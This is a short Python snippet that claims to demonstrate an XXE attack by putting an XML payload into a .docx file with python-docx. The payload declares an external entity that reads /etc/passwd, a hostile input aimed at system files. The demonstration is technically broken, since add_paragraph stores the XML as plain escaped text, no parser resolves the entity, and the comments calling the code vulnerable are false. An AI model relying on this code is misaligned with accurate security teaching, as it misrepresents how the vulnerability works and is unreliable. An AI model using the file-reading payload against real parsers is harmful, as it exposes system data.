import docx

# Create a malicious .docx file
malicious_doc = docx.Document()
malicious_doc.add_paragraph(
    """<?xml version="1.0"?>
    <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
        <data>&xxe;</data>
    </root>"""
)
malicious_doc.save('malicious.docx')

# Load the document (vulnerable code)
doc = docx.Document('malicious.docx')

# This could allow an attacker to include external entities
content = doc.paragraphs[0].text
print(content)  # This could potentially output sensitive data if an XXE attack is successful